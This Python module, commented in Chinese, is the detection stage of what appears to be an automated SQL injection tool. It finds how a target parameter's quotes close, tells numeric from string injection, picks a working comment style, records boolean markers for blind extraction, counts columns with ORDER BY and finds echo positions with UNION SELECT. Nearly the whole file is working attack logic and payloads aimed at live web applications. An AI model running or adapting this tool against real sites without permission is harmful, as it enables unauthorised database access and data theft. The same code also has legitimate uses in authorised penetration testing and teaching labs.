"""注入点发现：闭合类型、注释符、数字型判定、列数与回显位。"""
from __future__ import annotations

from typing import List, Optional

from .models import InjectionPoint, ResponseInfo, similarity
from .session import HttpSession

MARKER_PREFIX = "asq"          # 回显位标记前缀，尽量避开常见词


class Detector:
    def __init__(self, session: HttpSession):
        self.s = session
        self.log = session.log
        self.R_base: Optional[ResponseInfo] = None
        self.R_err: Optional[ResponseInfo] = None

    # ------------------------------------------------------------------ utils
    def _send(self, value: str) -> ResponseInfo:
        return self.s.request_value(value)

    def _same_as_base(self, r: ResponseInfo, threshold: float = 0.98) -> bool:
        return similarity(r, self.R_base) >= threshold and r.status_code == self.R_base.status_code

    # ------------------------------------------------------------------ main
    def analyze(self) -> Optional[InjectionPoint]:
        spec = self.s.spec
        self.R_base = self._send(spec.base_value)
        if self.R_base.status_code < 0:
            self.log("ERROR", "基线请求失败，请检查目标 URL / 登录配置")
            return None
        self.log("INFO", f"基线响应: {self.R_base.status_code}, {self.R_base.length}B")

        inj = InjectionPoint(param=spec.param, base_value=spec.base_value)
        # 数字型优先（medium 类转义环境下引号闭合会造成误判）
        if self._probe_numeric():
            inj.closure = ""
            inj.numeric = True
        else:
            closure = self._probe_closure()
            if closure is not None:
                inj.closure = closure
                inj.numeric = False
            else:
                self.log("WARN", "未发现明显注入点（闭合探测无 SQL 报错，数字型布尔无差异）")
                return None

        comment = self._probe_comment(inj)
        inj.comment = comment
        self._probe_bool(inj)
        self._probe_columns(inj)
        return inj

    # ------------------------------------------------------------------ closure
    def _probe_closure(self) -> Optional[str]:
        """逐一试探引号类闭合：
        1) 报错法：suffix 引发 SQL 报错即命中；
        2) 布尔法（LIMIT 拼接等环境下 1' 合法不报错）：
           1{suffix} and 1=1# 与 1=2 页面有差异即命中。"""
        for suffix in ("'", '"', "')", '")', "`"):
            r = self._send(self.s.spec.base_value + suffix)
            if r.has_sql_error():
                self.R_err = r
                self.log("INFO", f"命中闭合: {suffix!r}（SQL 报错回显）")
                return suffix
            if r.has_waf_block():
                self.log("WARN", f"探测 {suffix!r} 时疑似被 WAF 拦截")
        # 保存一个"无报错"参照（供 WAF 扫描使用）
        self.R_err = self._send(self.s.spec.base_value + "'")

        # 布尔确认兜底
        for suffix in ("'", "')"):
            t = self._send(f"{self.s.spec.base_value}{suffix} and 1=1#")
            f = self._send(f"{self.s.spec.base_value}{suffix} and 1=2#")
            if t.status_code > 0 and self._same_as_base(t, 0.9) and self._differs(t, f):
                self.log("INFO", f"命中闭合: {suffix!r}（布尔差异确认，报错法未命中）")
                return suffix
        return None

    def _probe_numeric(self) -> bool:
        """数字型判定：and 1=1 / and 1=2 页面差异。"""
        t = self._send(f"{self.s.spec.base_value} and 1=1")
        f = self._send(f"{self.s.spec.base_value} and 1=2")
        if t.status_code < 0 or f.status_code < 0:
            return False
        if not self._differs(t, f):
            return False
        if self._same_as_base(t, 0.9):
            self.log("INFO", "数字型注入确认（and 1=1 与 and 1=2 存在差异）")
            return True
        return False

    @staticmethod
    def _differs(a: ResponseInfo, b: ResponseInfo) -> bool:
        return similarity(a, b) < 0.995 or a.status_code != b.status_code

    # ------------------------------------------------------------------ comment
    def _probe_comment(self, inj: InjectionPoint) -> str:
        """探测尾部处理方式，返回最优 comment（含 quote-close）。"""
        base = inj.base_value
        pre = base if inj.numeric else base + inj.closure
        candidates = [
            ("#",        f"{pre} and 1=1#"),
            ("-- ",      f"{pre} and 1=1-- "),
            ("--+#",     f"{pre} and 1=1--+#"),
            ("quote-close", f"{pre} and '1'='1" if not inj.numeric else None),
        ]
        for name, payload in candidates:
            if payload is None:
                continue
            t = self._send(payload)
            f = self._send(payload.replace("1=1", "1=2"))
            if t.status_code < 0 or f.status_code < 0:
                continue
            if self._same_as_base(t, 0.9) and self._differs(t, f):
                self.log("INFO", f"注释/收尾方式可用: {name!r}")
                return name
        # and 可能被过滤：用 or 再试一遍（数字型直接跳过）
        if not inj.numeric:
            for name in ("#", "-- ", "quote-close"):
                payload = (f"{pre} or 1=1#" if name != "quote-close" else f"{pre} or '1'='1")
                t = self._send(payload)
                f = self._send(payload.replace("1=1", "1=2").replace("'1'='1", "'1'='2"))
                if t.status_code > 0 and not self._same_as_base(t, 0.95) and self._differs(t, f):
                    # or 1=1 返回多行，页面会比基线大，判据是真假有差异
                    self.log("INFO", f"注释/收尾方式可用(and被滤，or验证): {name!r}")
                    return name
        self.log("WARN", "未找到可用注释符，默认使用 #（可能需要手工调整）")
        return "#"

    def _probe_bool(self, inj: InjectionPoint):
        """记录布尔差异标记，供盲注使用。"""
        pre = inj.base_value if inj.numeric else inj.base_value + inj.closure
        tail = inj.comment if inj.comment != "quote-close" else ""
        t = self._send(f"{pre} and 1=1{tail}")
        f = self._send(f"{pre} and 1=2{tail}")
        inj.bool_markers = {"true_len": t.length, "false_len": f.length,
                            "true_status": t.status_code, "false_status": f.status_code}

    # ------------------------------------------------------------------ union
    def _probe_columns(self, inj: InjectionPoint):
        """order by 列数 + union 回显位（select/union 可用时）。
        判定用「成功/失败双参照最近邻」：兼容报错文本被隐藏的环境。"""
        pre = f"{inj.base_value}{inj.closure}"
        r_ok = self._send(f"{pre} order by 1{inj.comment}")
        r_bad = self._send(f"{pre} order by 999{inj.comment}")
        if r_ok.status_code < 0 or similarity(r_ok, r_bad) > 0.99:
            return          # 页面对 order by 成败无区分度
        is_err = lambda r: similarity(r, r_bad) >= similarity(r, r_ok)

        lo, hi, good = 1, 40, 0
        while lo <= hi:
            mid = (lo + hi) // 2
            r = self._send(f"{pre} order by {mid}{inj.comment}")
            if r.status_code > 0 and not is_err(r) and not r.has_waf_block():
                good, lo = mid, mid + 1
            else:
                hi = mid - 1
        if good == 0:
            return
        inj.column_count = good
        self.log("INFO", f"ORDER BY 探测列数: {good}")

        markers = [f"{MARKER_PREFIX}{i:02d}x7" for i in range(good)]
        cols = ",".join(f"'{m}'" for m in markers)
        r = self._send(f"0{inj.closure} union select {cols}{inj.comment}")
        if r.status_code > 0:
            pos = [i + 1 for i, m in enumerate(markers) if m in r.body]
            if pos:
                inj.echo_positions = pos
                self.log("INFO", f"回显位: 第 {pos} 列")
